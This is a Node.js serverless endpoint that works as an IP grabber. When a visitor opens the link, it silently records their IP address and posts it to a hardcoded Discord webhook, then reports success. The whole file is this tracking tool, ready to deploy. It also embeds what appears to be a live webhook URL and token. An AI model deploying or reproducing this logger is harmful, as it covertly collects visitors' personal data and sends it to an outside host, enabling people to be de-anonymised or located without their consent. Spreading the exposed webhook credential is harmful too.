const fetch = require('node-fetch');

// Your Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1306285452394889226/N79NNR4O9o-_JAO133sHZ1ltgs-JAXgIGGMv6ucBlA-JhyTPzL4JkDSd7VZciPhHerdC';
module.exports = async (req, res) => {
    if (req.method === 'GET') {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

        // Prepare the message to send to Discord
        const message = {
            content: `New IP logged: ${ip}`,
        };

        // Send the IP to Discord
        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(message),
            });
            res.status(200).json({ message: 'IP logged and sent to Discord.' });
        } catch (error) {
            res.status(500).json({ error: 'Failed to log IP' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
};
